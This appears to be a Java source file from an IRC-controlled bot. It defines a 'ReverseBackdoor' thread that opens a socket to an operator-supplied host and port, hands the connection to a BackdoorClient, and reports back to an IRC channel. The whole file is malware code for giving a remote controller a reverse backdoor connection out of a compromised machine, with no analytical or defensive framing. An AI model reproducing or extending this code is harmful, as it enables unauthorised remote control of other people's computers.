import java.net.Socket;
import java.io.IOException;

class ReverseBackdoor extends Thread {

	private IRC irc;
	private String channel;

	private String host;
	private int port;

	public ReverseBackdoor(IRC irc, String channel, String host, int port) {
		this.irc = irc;
		this.channel = channel;
		this.host = host;
		this.port = port;
	}

	public void run() {
		if(MiscStatus.backdoorConnected) {
			this.irc.sendMessage(this.channel, "Reverse backdoor already exists.");
		} else {
			try {
				Socket socket = new Socket(this.host, this.port);
				new BackdoorClient(socket);
				MiscStatus.backdoorConnected = true;
			} catch(IOException ioe) {
				this.irc.sendMessage(this.channel, "Couldn't connect to " + this.host + ":" + this.port + " IOException thrown: " + ioe.toString());
			}
		}
	}

}